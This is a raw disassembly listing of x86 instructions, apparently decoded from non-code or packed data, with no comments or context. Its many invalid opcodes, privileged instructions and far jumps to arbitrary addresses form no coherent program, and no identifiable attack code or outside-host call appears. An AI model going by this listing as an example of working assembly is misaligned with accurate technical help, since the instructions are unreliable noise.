  410ce9:	push   esi
  410cea:	fbld   TBYTE PTR [ebp+0x325f0d71]
  410cf0:	call   0x67ac0fcc
  410cf5:	retf   
  410cf6:	mov    edi,0x67061115
  410cfb:	test   bl,bl
  410cfd:	or     bh,BYTE PTR [ecx+0x6b708b70]
  410d03:	dec    BYTE PTR [ebx-0x665d7074]
  410d09:	addr16 jp 0x410d75
  410d0c:	jo     0x410c9b
  410d0e:	pop    esi
  410d0f:	(bad)
  410d13:	fs inc edx
  410d15:	stos   BYTE PTR es:[edi],al
  410d16:	mov    bh,0xa0
  410d18:	(bad)  
  410d19:	cli    
  410d1a:	cmp    DWORD PTR [edi-0x5dd50606],esi
  410d20:	push   ds
  410d21:	jl     0x410d03
  410d23:	mov    esp,0x1c781f75
  410d28:	push   es
  410d29:	cmp    BYTE PTR [ebp+0x61],bh
  410d2c:	add    al,0xd7
  410d2e:	and    DWORD PTR ds:[edi+eax*8-0x713f1644],0x14d7e47b
  410d3a:	or     edx,ebx
  410d3c:	outs   dx,BYTE PTR ds:[esi]
  410d3d:	push   esp
  410d3e:	push   ecx
  410d3f:	out    0xa4,al
  410d41:	inc    esi
  410d42:	jnp    0x410cdc
  410d44:	or     dl,BYTE PTR [esp+esi*8]
  410d47:	jbe    0x410d99
  410d49:	jg     0x410cfc
  410d4b:	sbb    dh,BYTE PTR [ebp+esi*2-0x59ebff46]
  410d52:	jne    0x410d5e
  410d54:	test   al,0xc8
  410d56:	sub    BYTE PTR [ebx+esi*1+0x2],bh
  410d5a:	jae    0x410d6a
  410d5c:	call   0xf963:0x853c197f
  410d63:	lahf   
  410d64:	or     al,0x18
  410d66:	xchg   esi,eax
  410d67:	jl     0x410dbe
  410d69:	(bad)  
  410d6a:	mov    edi,0xab943cd3
  410d6f:	sbb    DWORD PTR [ecx-0x11],0xffffffe1
  410d73:	ucomiss xmm1,DWORD PTR [ebx]
  410d76:	jle    0x410d60
  410d78:	(bad)  
  410d79:	call   0x21e5:0x8166cfb0
  410d80:	scas   eax,DWORD PTR es:[edi]
  410d81:	or     ebx,DWORD PTR [ecx+0x23]
  410d84:	dec    esi
  410d85:	and    edi,DWORD PTR [edi+ebp*4]
  410d88:	iret   
  410d89:	imul   ebx,DWORD PTR [edx],0xe3aa879f
  410d8f:	call   0x57f5:0xb2612c45
  410d96:	dec    ebx
  410d97:	mov    ecx,0x27e17283
  410d9c:	sbb    esp,esp
  410d9e:	retf   
  410d9f:	imul   BYTE PTR [esi+0x4ef98eea]
  410da5:	shl    bh,1
  410da7:	stos   DWORD PTR es:[edi],eax
  410da8:	ja     0x410df5
  410daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dab:	mov    dl,BYTE PTR [edi-0x38]
  410dae:	retf   
  410daf:	adc    eax,DWORD PTR [ebp+0x782ee5cf]
  410db5:	ds pop edx
  410db7:	push   0x5f
  410db9:	push   ebp
  410dba:	in     eax,dx
  410dbb:	rol    DWORD PTR [edi+0x16a83649],cl
  410dc1:	loop   0x410da4
  410dc3:	cmp    ecx,DWORD PTR [ecx-0x71]
  410dc6:	push   esi
  410dc7:	sbb    DWORD PTR [ebx-0x5a],ecx
  410dca:	jle    0x410dc0
  410dcc:	dec    esi
  410dcd:	xor    edx,DWORD PTR [edx-0x1b]
  410dd0:	arpl   WORD PTR [ebx],dx
  410dd2:	push   0xffffffe4
  410dd4:	cli    
  410dd5:	or     edx,eax
  410dd7:	cmp    ecx,DWORD PTR ds:0xca2f6870
  410ddd:	push   0x78
  410ddf:	cmp    esp,0x78
  410de2:	fs mov dl,0xb0
  410de5:	xchg   ecx,ecx
  410de7:	pop    esi
  410de8:	push   edx
  410de9:	and    edi,DWORD PTR [eax]
  410deb:	cwde   
  410dec:	or     ah,BYTE PTR [edx+esi*1]
  410def:	clc    
  410df0:	mov    dl,BYTE PTR [edi]
  410df2:	outs   dx,BYTE PTR ds:[esi]
  410df3:	and    dl,cl
  410df5:	addr16 in al,dx
  410df7:	retf   
  410df8:	mov    eax,ds:0x765badb0
  410dfd:	cmc    
  410dfe:	xor    DWORD PTR [esi+0x61],esi
  410e01:	in     al,dx
  410e02:	mov    dh,0xb7
  410e04:	push   edi
  410e05:	loopne 0x410e85
  410e07:	lock int 0x35
  410e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e0b:	or     DWORD PTR [edx-0x79],0xd67e50ba
  410e12:	icebp  
  410e13:	imul   eax,DWORD PTR [ebx-0x484db5d4],0x60
  410e1a:	test   DWORD PTR [ebp-0x6b522a61],0x55ccfd21
  410e24:	test   al,0x54
  410e26:	dec    edx
  410e27:	je     0x410e04
  410e29:	rol    DWORD PTR [edx+0x1c],cl
  410e2c:	mov    eax,ds:0xc1e360a2
  410e31:	dec    edx
  410e32:	adc    al,0xac
  410e34:	mov    ebx,0x63442cc4
  410e39:	add    edi,DWORD PTR [ebp+0x30ae3815]
  410e3f:	das    
  410e40:	rcl    ecx,0x97
  410e43:	bswap  ebp
  410e45:	cmp    al,0x13
  410e47:	cmp    BYTE PTR [edi],0xf7
  410e4a:	test   BYTE PTR [edx],cl
  410e4c:	scas   al,BYTE PTR es:[edi]
  410e4d:	push   edx
  410e4e:	sbb    eax,DWORD PTR ds:0x25e70c47
  410e54:	sbb    ebx,DWORD PTR ds:0x9829a607
  410e5a:	stos   BYTE PTR es:[edi],al
  410e5b:	jecxz  0x410dfe
  410e5d:	int3   
  410e5e:	fistp  DWORD PTR [eax-0x6a]
  410e61:	inc    ebp
  410e62:	(bad)  
  410e63:	jns    0x410ee2
  410e65:	(bad)  
  410e66:	pop    eax
  410e67:	jo     0x410e8a
  410e69:	mov    edx,0xb33c56f2
  410e6e:	lods   eax,DWORD PTR ds:[esi]
  410e6f:	shl    BYTE PTR [ebx+0x793891e1],cl
  410e75:	xor    BYTE PTR [ebx-0x67],ch
  410e78:	xchg   esp,eax
  410e79:	jns    0x410e27
  410e7b:	(bad)  
  410e7c:	push   ss
  410e7d:	mov    DWORD PTR [eax-0x38],0xcafea40c
  410e84:	dec    esp
  410e85:	mov    dh,0x57
  410e87:	xor    esp,ebx
  410e89:	test   al,0x72
  410e8b:	and    eax,0x76d1a0b4
  410e90:	imul   edx,DWORD PTR [eax],0xb6d1260c
  410e96:	xchg   esi,eax
  410e97:	stos   DWORD PTR es:[edi],eax
  410e98:	cld    
  410e99:	and    al,0xf7
  410e9b:	adc    BYTE PTR [ecx+0x5ee69466],al
  410ea1:	jae    0x410ec9
  410ea3:	loopne 0x410edd
  410ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ea6:	inc    edi
  410ea7:	mov    edx,0xc0723263
  410eac:	cwde   
  410ead:	lahf   
  410eae:	pop    es
  410eaf:	daa    
  410eb0:	je     0x410eaf
  410eb2:	xlat   BYTE PTR ds:[ebx]
  410eb3:	(bad)  
  410eb4:	pop    eax
  410eb5:	mov    cl,0x7b
  410eb7:	xchg   edi,eax
  410eb8:	adc    DWORD PTR [esi-0x4e],esp
  410ebb:	stos   DWORD PTR es:[edi],eax
  410ebc:	push   cs
  410ebd:	ror    ebx,1
  410ebf:	rcr    BYTE PTR [ebp-0x25],cl
  410ec2:	adc    cl,BYTE PTR [ebx-0x3f]
  410ec5:	dec    ecx
  410ec6:	xchg   edx,eax
  410ec7:	adc    eax,0x6da551be
  410ecc:	das    
  410ecd:	outs   dx,BYTE PTR ds:[si]
  410ecf:	icebp  
  410ed0:	mov    eax,ds:0xc5093eb6
  410ed5:	lahf   
  410ed6:	jno    0x410f04
  410ed8:	mov    dh,0xa0
  410eda:	xor    al,0xe8
  410edc:	(bad)  
  410edd:	adc    edx,DWORD PTR [edi-0x3e3cda38]
  410ee3:	out    0x67,eax
  410ee5:	sub    ebp,ebp
  410ee7:	mov    al,ds:0xc85338c1
  410eec:	mov    edi,cs
  410eee:	and    edi,DWORD PTR [ebp+ecx*8-0x17]
  410ef2:	inc    ecx
  410ef3:	int3   
  410ef4:	xchg   BYTE PTR [esi+0x386ea83d],cl
  410efa:	(bad)  
  410efb:	adc    ah,bl
  410efd:	aas    
  410efe:	lea    esp,[ebp-0x4f]
  410f01:	jl     0x410f1a
  410f03:	div    BYTE PTR [ecx+0x1021da82]
  410f09:	push   0x47
  410f0b:	lds    ecx,FWORD PTR [ebx+0x46]
  410f0e:	(bad)  
  410f0f:	aad    0xc0
  410f11:	enter  0x956b,0x31
  410f15:	inc    ebp
  410f16:	sub    eax,0x63fea4b9
  410f1b:	aas    
  410f1c:	xchg   ecx,eax
  410f1d:	ret    
  410f1e:	mov    dh,0x73
  410f20:	lock jp 0x410edc
  410f23:	push   edi
  410f24:	test   al,0x9d
  410f26:	push   edx
  410f27:	sbb    eax,0xe797343a
  410f2c:	in     eax,dx
  410f2d:	add    eax,0x39929aa6
  410f32:	dec    eax
  410f33:	in     al,dx
  410f34:	leave  
  410f35:	sbb    dh,BYTE PTR ds:0xdcebdd2d
  410f3b:	ffree  st(3)
  410f3d:	mov    eax,0xad511cc1
  410f42:	clc    
  410f43:	cmp    ch,BYTE PTR [edx-0x6bc1daa4]
  410f49:	stos   DWORD PTR es:[edi],eax
  410f4a:	in     al,dx
  410f4b:	hlt    
  410f4c:	ja     0x410f74
  410f4e:	fsub   DWORD PTR [edx+0x44]
  410f51:	jne    0x410f73
  410f53:	jb     0x410f3c
  410f55:	jmp    0x410f87
  410f57:	mov    bh,0x10
  410f59:	mov    ss,WORD PTR [esi]
  410f5b:	mov    ch,0x8c
  410f5d:	in     al,dx
  410f5e:	psubb  mm7,QWORD PTR [ecx+edi*8]
  410f62:	mov    esp,0x3a5ffecf
  410f67:	outs   dx,DWORD PTR ds:[esi]
  410f68:	or     esi,DWORD PTR [ecx+0x75]
  410f6b:	mov    ebx,0x62e4fba2
  410f70:	mov    WORD PTR [ebp-0x44],gs
  410f73:	rsqrtps xmm0,XMMWORD PTR ds:[ebp+0x2e]
  410f78:	xor    eax,DWORD PTR [ebx-0x544284d8]
  410f7e:	lods   eax,DWORD PTR ds:[esi]
  410f7f:	lods   eax,DWORD PTR ds:[esi]
  410f80:	sub    edx,esi
  410f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f83:	mov    dl,0xa5
  410f85:	popa   
  410f86:	stos   BYTE PTR es:[edi],al
  410f87:	xlat   BYTE PTR ds:[ebx]
  410f88:	adc    eax,0xa1ad4657
  410f8d:	cwde   
  410f8e:	js     0x410fce
  410f90:	aam    0xe8
  410f92:	das    
  410f93:	push   0x6d01b9fc
  410f98:	out    0x68,al
  410f9a:	push   0xec375555
  410f9f:	cmp    ebp,esi
  410fa1:	adc    eax,0x6a6b6948
  410fa6:	xor    dl,al
  410fa8:	jp     0x410f68
  410faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fab:	je     0x410f37
  410fad:	ins    DWORD PTR es:[edi],dx
  410fae:	pop    ds
  410faf:	xor    al,0x44
  410fb1:	sub    BYTE PTR [ecx-0xe],ch
  410fb4:	or     al,0xbc
  410fb6:	cmc    
  410fb7:	cli    
  410fb8:	and    DWORD PTR [eax],esi
  410fba:	in     eax,dx
  410fbb:	sub    ebp,eax
  410fbd:	sub    eax,0x959f0073
  410fc2:	push   eax
  410fc3:	jbe    0x410f4c
  410fc5:	push   0x3d17944f
  410fca:	pop    edi
  410fcb:	daa    
  410fcc:	into   
  410fcd:	dec    esp
  410fce:	arpl   WORD PTR [eax],dx
  410fd0:	(bad)  ss:[edi]
  410fd3:	jmp    0x410fea
  410fd5:	ret    
  410fd6:	sbb    edx,ebx
  410fd8:	sahf   
  410fd9:	pop    edi
  410fda:	popa   
  410fdb:	ins    BYTE PTR es:[edi],dx
  410fdc:	cmp    eax,0x61bfd4cd
  410fe1:	dec    edx
  410fe2:	xchg   ebx,eax
  410fe3:	shl    bh,1
  410fe5:	cmp    eax,0x4871feed
  410fea:	(bad)  
  410feb:	pusha  
  410fec:	inc    esp
  410fed:	mov    eax,0xce008513
  410ff2:	ins    BYTE PTR es:[edi],dx
  410ff3:	das    
  410ff4:	adc    edx,DWORD PTR [ecx]
  410ff6:	xor    eax,esp
  410ff8:	jl     0x410fc7
  410ffa:	or     al,0x88
  410ffc:	int    0x8d
  410ffe:	iret   
  410fff:	and    eax,0x359eca2
  411004:	mov    al,0xba
  411006:	fst    st(4)
  411008:	outs   dx,DWORD PTR ds:[esi]
  411009:	xor    edi,DWORD PTR [ebp-0x4326560b]
  41100f:	gs jo  0x410fdd
  411012:	cli    
  411013:	dec    BYTE PTR ds:0x272565fd
  411019:	fwait
  41101a:	je     0x410ff3
  41101c:	in     eax,dx
  41101d:	(bad)  
  41101e:	je     0x41109f
  411020:	add    edi,DWORD PTR [ebx]
  411022:	and    bh,BYTE PTR [edi]
  411024:	ins    BYTE PTR es:[edi],dx
  411025:	mov    eax,0x2b2f250e
  41102a:	dec    ebp
  41102b:	fwait
  41102c:	xor    edx,DWORD PTR [ecx+0x4]
  41102f:	ror    bl,1
  411031:	adc    eax,0x4b1f544a
  411036:	sbb    esi,DWORD PTR [esi]
  411038:	jl     0x411076
  41103a:	fidivr WORD PTR [edx+0x54145987]
  411040:	cmp    BYTE PTR [ecx-0x74],0xc1
  411044:	nop
  411045:	xchg   esi,eax
  411046:	js     0x41104c
  411048:	ins    BYTE PTR es:[edi],dx
  411049:	iret   
  41104a:	leave  
  41104b:	imul   edi,esi,0x35
  41104e:	sbb    DWORD PTR [esi+0x2cb9cf27],ebp
  411054:	rcr    BYTE PTR [edi],1
  411056:	mov    BYTE PTR [eax],bl
  411058:	scas   eax,DWORD PTR es:[edi]
  411059:	ror    BYTE PTR [ebx+0x78],cl
  41105c:	adc    eax,esi
  41105e:	jg     0x410fe1
  411060:	(bad)  
  411061:	mov    ds:0x21743e84,al
  411066:	fmul   QWORD PTR [edx]
  411068:	adc    dh,BYTE PTR [ebx+0x7624608d]
  41106e:	jbe    0x411019
  411070:	mov    bh,BYTE PTR [eax+0x678b94ba]
  411076:	and    DWORD PTR [esi],ebx
  411078:	pop    ss
  411079:	and    cl,BYTE PTR [edi+0x5f]
  41107c:	gs inc ebx
  41107e:	adc    ch,dl
  411080:	mov    ebp,0xe836c16a
  411085:	inc    edi
  411086:	sar    DWORD PTR [eax+eiz*4],0x47
  41108a:	add    BYTE PTR [ebx],dl
  41108c:	cwde   
  41108d:	add    eax,0x23b7d390
  411092:	loop   0x4110f3
  411094:	xchg   edi,eax
  411095:	(bad)  
  411096:	and    BYTE PTR [edx+edi*8-0x71e71bd7],al
  41109d:	(bad)  
  41109e:	mov    al,ds:0x52ebf491
  4110a3:	pop    ebp
  4110a4:	imul   ecx,DWORD PTR [ecx+edx*1-0x6d],0x12
  4110a9:	jo     0x411102
  4110ab:	arpl   bx,bp
  4110ad:	jae    0x411053
  4110af:	add    bh,BYTE PTR ds:0x86610b02
  4110b5:	out    dx,eax
  4110b6:	jge    0x41104a
  4110b8:	fninit 
  4110ba:	(bad)  
  4110bb:	fadd   DWORD PTR [ecx]
  4110bd:	ret    0xc57c
  4110c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c1:	test   BYTE PTR [eax],dh
  4110c3:	clc    
  4110c4:	xchg   edi,eax
  4110c5:	cs jp  0x4110b1
  4110c8:	inc    ebp
  4110c9:	(bad)  
  4110ca:	into   
  4110cb:	pop    ss
  4110cc:	or     esi,0x20c1a33c
  4110d2:	call   0xd0db:0xbee146d0
  4110d9:	cmp    dh,0x3a
  4110dc:	inc    esi
  4110dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110de:	jge    0x4110bc
  4110e0:	je     0x411074
  4110e2:	cwde   
  4110e3:	sub    ebp,ebp
  4110e5:	jg     0x41109d
  4110e7:	xchg   edi,eax
  4110e8:	loopne 0x41107e
  4110ea:	xor    BYTE PTR [ecx],ah
  4110ec:	pusha  
  4110ed:	jmp    0x4110dc
  4110ef:	mov    ecx,0x3b14efb7
  4110f4:	dec    ebp
  4110f5:	daa    
  4110f6:	xchg   ecx,eax
  4110f7:	pop    es
  4110f8:	cmp    edi,edx
  4110fa:	test   BYTE PTR [edi-0x79bf7830],ah
  411100:	adc    al,0x63
  411102:	sar    BYTE PTR [eax+0x40],1
  411105:	or     ch,BYTE PTR [esi+eiz*1+0x55]
  411109:	fistp  QWORD PTR [ecx+ebp*2+0x1f04f954]
  411110:	mov    ds:0x39468456,al
  411115:	imul   esp,DWORD PTR gs:[esi-0x6],0xffffff9a
  41111a:	xchg   ebx,eax
  41111b:	adc    eax,0x63781711
  411120:	popa   
  411121:	(bad)
  411124:	loopne 0x4110e5
  411126:	inc    ebx
  411127:	out    dx,al
  411128:	cmp    al,ah
  41112a:	pop    es
  41112b:	inc    ebx
  41112c:	lahf   
  41112d:	pop    edx
  41112e:	ds hlt 
  411130:	repnz mov dl,0xce
  411133:	in     eax,dx
  411134:	push   ebx
  411135:	sub    DWORD PTR [edx+0x7e1e2fb2],ecx
  41113b:	fdiv   QWORD PTR [ecx]
  41113d:	in     eax,0xbc
  41113f:	in     al,0xc3
  411141:	fadd   st(5),st
  411143:	push   edx
  411144:	dec    ebp
  411145:	push   ds
  411146:	stc    
  411147:	add    dh,BYTE PTR ds:0x1d0b1aa4
  41114d:	add    bl,BYTE PTR [ebx+0x73daf2a9]
  411153:	push   ebp
  411154:	repz dec eax
  411156:	sub    al,0xd1
  411158:	mov    ds:0x59004f27,eax
  41115d:	inc    ebp
  41115e:	jle    0x4110f0
  411160:	or     edx,DWORD PTR ds:0x9637623d
  411166:	jp     0x411123
  411168:	jp     0x4110f0
  41116a:	and    edi,DWORD PTR [eax+0x78cae9d7]
  411170:	out    dx,al
  411171:	call   0xab1d9fba
  411176:	(bad)  
  411177:	xor    cl,dh
  411179:	cwde   
  41117a:	mov    al,ds:0xc8143b5a
  41117f:	repnz mov cl,0x7b
  411182:	pop    ebx
  411183:	lds    eax,FWORD PTR [eax+0x4e3c132a]
  411189:	hlt    
  41118a:	push   ds
  41118b:	loope  0x411131
  41118d:	imul   edx,DWORD PTR [esi-0x249574a7],0x71
  411194:	ficom  DWORD PTR [ecx+0xb]
  411197:	adc    DWORD PTR [esi-0xb],esp
  41119a:	bnd jns 0x41111d
  41119d:	and    al,0x1a
  41119f:	int    0x43
  4111a1:	pop    ebp
  4111a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a3:	push   esp
  4111a4:	push   es
  4111a5:	xchg   esp,eax
  4111a6:	dec    eax
  4111a7:	jb     0x4111bf
  4111a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111aa:	mul    DWORD PTR [ecx-0x7d]
  4111ad:	dec    eax
  4111ae:	cmc    
  4111af:	pushf  
  4111b0:	and    eax,0x2a547f8d
  4111b5:	loop   0x411225
  4111b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111b8:	loopne 0x41122e
  4111ba:	pop    ebp
  4111bb:	cli    
  4111bc:	loopne 0x411151
  4111be:	out    dx,al
  4111bf:	cmp    bh,BYTE PTR ds:[ebp-0x5eae7919]
  4111c6:	mov    ds:0xdfe2bb0d,eax
  4111cb:	ins    DWORD PTR es:[edi],dx
  4111cc:	ins    DWORD PTR es:[edi],dx
  4111cd:	cmc    
  4111ce:	gs jae 0x4111b7
  4111d1:	pop    edi
  4111d2:	ds cli 
  4111d4:	jmp    0x70f88f78
  4111d9:	jp     0x411209
  4111db:	pop    eax
  4111dc:	test   bh,0xfc
  4111df:	out    0xff,al
  4111e1:	xchg   esp,eax
  4111e2:	test   DWORD PTR [eax+0x5e],esi
  4111e5:	data16 jns 0x4111cd
  4111e8:	dec    esp
  4111e9:	mov    ebp,0xc7015743
  4111ee:	mov    DWORD PTR [ebp+ebx*2-0x3d6f27c],esi
  4111f5:	jb     0x411264
  4111f7:	pop    ebp
  4111f8:	or     DWORD PTR [ecx-0x67f55cd9],esi
  4111fe:	mov    dh,0xd3
  411200:	add    eax,0x6748f29
  411205:	cmp    BYTE PTR [ecx],dl
  411207:	mov    ecx,gs
  411209:	mov    esi,0x5eaf36cb
  41120e:	or     DWORD PTR [ecx],esp
  411210:	fs leave 
  411212:	jb     0x411214
  411214:	or     esp,esi
  411216:	xchg   esi,eax
  411217:	retf   0x8974
  41121a:	pop    edx
  41121b:	sbb    BYTE PTR ds:0x214d6bc1,0x6f
  411222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411225:	xchg   ebx,eax
  411226:	fdivr  st(5),st
  411228:	ins    DWORD PTR es:[edi],dx
  411229:	aad    0xe9
  41122b:	or     ecx,ebx
  41122d:	stos   DWORD PTR es:[edi],eax
  41122e:	jbe    0x411202
  411230:	jmp    0xc60b:0x476ba24
  411237:	imul   ebx,ecx,0x3
  41123a:	jo     0x41128f
  41123c:	shr    al,0x90
  41123f:	js     0x4111cc
  411241:	mov    ?,esp
  411243:	cmp    al,0xdf
  411245:	jge    0x411254
  411247:	pusha  
  411248:	bound  ecx,QWORD PTR [eax]
  41124a:	cmp    eax,0x59a91727
  41124f:	mov    ds:0x48ad0c01,eax
  411254:	int3   
  411255:	popf   
  411256:	lods   eax,DWORD PTR ds:[esi]
  411257:	adc    edi,DWORD PTR [eax-0x1c63aadd]
  41125d:	imul   edx,DWORD PTR [ecx-0x7],0x56
  411261:	outs   dx,DWORD PTR ds:[esi]
  411262:	leave  
  411263:	xor    al,0x55
  411265:	iret   
  411266:	sar    ah,0x41
  411269:	iret   
  41126a:	dec    ecx
  41126b:	or     BYTE PTR [ebx-0x27567ac],bh
  411271:	mov    al,0x49
  411273:	dec    eax
  411274:	pop    ds
  411275:	add    ecx,DWORD PTR [esi]
  411277:	in     eax,0x11
  411279:	jg     0x411230
  41127b:	and    cl,BYTE PTR [edx+0xe08a0ef]
  411281:	or     esi,DWORD PTR [ecx+0x17]
  411284:	push   ecx
  411285:	mov    esp,ebp
  411287:	inc    ecx
  411288:	out    0xe1,eax
  41128a:	adc    al,0xd8
  41128c:	or     bl,al
  41128e:	call   0xd21b:0xc4388111
  411295:	(bad)  
  411296:	shl    BYTE PTR [ebx-0x12],0x51
  41129a:	xchg   ecx,eax
  41129b:	rol    edx,1
  41129d:	sbb    al,0xe8
  41129f:	push   esp
  4112a0:	fmul   st,st(7)
  4112a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a3:	mov    DWORD PTR [eax+edx*2-0x18],esp
  4112a7:	out    dx,al
  4112a8:	popf   
  4112a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112aa:	add    dl,BYTE PTR [edi-0x69]
  4112ad:	xchg   esi,eax
  4112ae:	iret   
  4112af:	and    cl,BYTE PTR [edx+esi*4+0x3c473ff1]
  4112b6:	inc    ebp
  4112b7:	stc    
  4112b8:	out    dx,eax
  4112b9:	push   esi
  4112ba:	stos   DWORD PTR es:[edi],eax
  4112bb:	ja     0x411245
  4112bd:	les    edx,FWORD PTR [esi-0x45]
  4112c0:	add    DWORD PTR [ecx+ebp*2+0x1073875c],esi
  4112c7:	jno    0x4112c5
  4112c9:	rol    BYTE PTR [esi],0x84
  4112cc:	inc    ebx
  4112cd:	xor    al,0x19
  4112cf:	cmp    ebx,DWORD PTR [esi+eiz*4+0x21f63daf]
  4112d6:	adc    DWORD PTR [edx],edx
  4112d8:	fldlg2 
  4112da:	xchg   esi,eax
  4112db:	out    dx,eax
  4112dc:	retf   
  4112dd:	out    dx,al
  4112de:	mov    al,ds:0x1bf617f5
  4112e3:	(bad)  
  4112e4:	xchg   edi,eax
  4112e5:	aam    0xb3
  4112e7:	dec    esp
  4112e8:	jb     0x4112e4
  4112ea:	add    esp,esi
  4112ec:	jb     0x411333
  4112ee:	and    al,0x19
  4112f0:	mov    al,ds:0x6d4ed2b4
  4112f5:	rol    BYTE PTR [eax],cl
  4112f7:	jae    0x41135f
  4112f9:	inc    ebx
  4112fa:	push   esp
  4112fb:	test   eax,0xa1c741d9
  411300:	mov    edi,0x8ce5b68b
  411305:	arpl   WORD PTR [esi],bp
  411307:	fiadd  WORD PTR [ebx]
  411309:	mov    eax,0xc9356010
  41130e:	mov    ds:0xe53ee290,al
  411313:	lods   al,BYTE PTR ds:[esi]
  411314:	xor    BYTE PTR [edi+0x35243798],cl
  41131a:	push   ds
  41131b:	es mov edi,0x5f6cfe1b
  411321:	push   esp
  411322:	outs   dx,DWORD PTR ds:[esi]
  411323:	(bad)  
  411324:	lahf   
  411325:	cdq    
  411326:	inc    ebp
  411327:	mov    BYTE PTR [ecx-0x4e4c2e4d],0xa4
  41132e:	cmp    ecx,DWORD PTR ds:0x6eeaebf4
  411334:	je     0x5296fc7a
  41133a:	sbb    al,dl
  41133c:	out    dx,al
  41133d:	dec    ebx
  41133e:	xor    esi,DWORD PTR [edi+ebp*4+0x2c]
  411342:	mov    BYTE PTR [esi+0xf],dl
  411345:	jmp    0xbf38:0x685a110f
  41134c:	mov    ecx,0x6af07fe8
  411351:	sahf   
  411352:	aam    0xc1
  411354:	dec    esp
  411355:	xor    ah,al
  411357:	pop    edx
  411358:	or     eax,0x448ed72b
  41135d:	retf   
  41135e:	setp   dl
  411361:	mov    bh,0x97
  411363:	mov    fs,WORD PTR ds:0x34b521ba
  411369:	push   eax
  41136a:	jmp    0x6114:0xb661c222
  411371:	xchg   ecx,eax
  411372:	xor    BYTE PTR [ebx],dh
  411374:	sub    al,0xaa
  411376:	shl    al,1
  411378:	repz retf 0x7e75
  41137c:	(bad)  
  41137d:	push   esi
  41137e:	sub    esp,DWORD PTR [eax+0x5fb86dba]
  411384:	xchg   ebx,eax
  411385:	ret    
  411386:	push   ebp
  411387:	cld    
  411388:	out    dx,eax
  411389:	push   0xe7bdce1f
  41138e:	pop    esp
  41138f:	sbb    ch,BYTE PTR [ebx-0x76]
  411392:	mov    esi,0x2d8d0b30
  411397:	retf   
  411398:	dec    ebx
  411399:	mov    eax,ds:0xaedfecd5
  41139e:	ja     0x411372
  4113a0:	pop    ebx
  4113a1:	loope  0x4113c1
  4113a3:	xor    DWORD PTR [ebp-0x6a6cc50e],edx
  4113a9:	jmp    0x41138e
  4113ab:	repz xlat BYTE PTR ds:[ebx]
  4113ad:	pop    eax
  4113ae:	xchg   ebx,eax
  4113af:	inc    esp
  4113b0:	or     al,0xc7
  4113b2:	sub    dl,ah
  4113b4:	shr    BYTE PTR [ebp+0x7e],cl
  4113b7:	pop    ebx
  4113b8:	inc    edi
  4113b9:	mov    dl,0xc4
  4113bb:	adc    edi,DWORD PTR [esp+ecx*4+0x41]
  4113bf:	xor    ah,bl
  4113c1:	rol    BYTE PTR [ebx+0x7118c003],1
  4113c7:	mov    al,0x44
  4113c9:	dec    ebx
  4113ca:	inc    edx
  4113cb:	les    ebx,FWORD PTR [eax+0x39386c9]
  4113d1:	and    dl,bl
  4113d3:	pop    ebx
  4113d4:	dec    ebp
  4113d5:	sub    ch,BYTE PTR [ebx]
  4113d7:	dec    esi
  4113d8:	scas   eax,DWORD PTR es:[edi]
  4113d9:	in     al,dx
  4113da:	mov    cl,0x9b
  4113dc:	addr16 retf 
  4113de:	mov    esp,0xf3d487a0
  4113e3:	jmp    0xb49e:0xd163a912
  4113ea:	jb     0x411417
  4113ec:	or     al,0x20
  4113ee:	xor    eax,0x2586abf7
  4113f3:	int    0xf2
  4113f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f6:	aas    
  4113f7:	or     BYTE PTR [edx+0x4b8a3b3e],ch
  4113fd:	rcr    edi,0x62
  411400:	inc    eax
  411401:	jl     0x411454
  411403:	cld    
  411404:	push   ds
  411405:	and    BYTE PTR [ebx+0x76],dl
  411408:	xor    edx,DWORD PTR [ecx]
  41140a:	shl    DWORD PTR ds:[ebx+0x3b15ae],0xe4
  411412:	and    BYTE PTR [edi],dh
  411414:	pop    eax
  411415:	sti    
  411416:	dec    esp
  411417:	push   edx
  411418:	adc    al,0x47
  41141a:	xor    eax,0x6f05a62f
  41141f:	xchg   edx,eax
  411420:	jnp    0x411406
  411422:	dec    edx
  411423:	dec    ebp
  411424:	mov    cl,0xb9
  411426:	xchg   BYTE PTR [esp+ebx*4+0xa3bc7a3],al
  41142d:	mov    ebp,0x1859b3a1
  411432:	out    0x63,al
  411434:	aas    
  411435:	mov    bh,0x99
  411437:	pushf  
  411438:	add    ah,ah
  41143a:	or     DWORD PTR ds:0xf9a26574,0xf8430325
  411444:	ror    BYTE PTR [edx],1
  411446:	add    esi,DWORD PTR [ecx+0x5e7cb281]
  41144c:	repnz loopne 0x41147d
  41144f:	jmp    DWORD PTR [ebx]
  411451:	jo     0x411498
  411453:	jge    0x4114a3
  411455:	jnp    0x4113f8
  411457:	retf   0x7569
  41145a:	dec    edi
  41145b:	sub    al,0x0
  41145d:	mov    dh,0xc2
  41145f:	add    ch,BYTE PTR [edx]
  411461:	pop    ebx
  411462:	iret   
  411463:	xchg   BYTE PTR [edi-0x73cfb3e9],dh
  411469:	les    edx,FWORD PTR [ecx-0x26d54978]
  41146f:	push   eax
  411470:	mov    edx,0x68050042
  411475:	dec    ecx
  411476:	imul   esp,DWORD PTR [edx+0x1042453a],0xffffffb1
  41147d:	add    eax,0xa2d3d31b
  411482:	or     DWORD PTR [ecx+ebx*1-0x31],edx
  411486:	jae    0x411485
  411488:	stc    
  411489:	jo     0x411461
  41148b:	daa    
  41148c:	ret    
  41148d:	inc    ebp
  41148e:	retf   
  41148f:	test   al,0x64
  411491:	cmp    edx,DWORD PTR ds:0xe35b2f8e
  411497:	xchg   edx,eax
  411498:	mov    al,0xdb
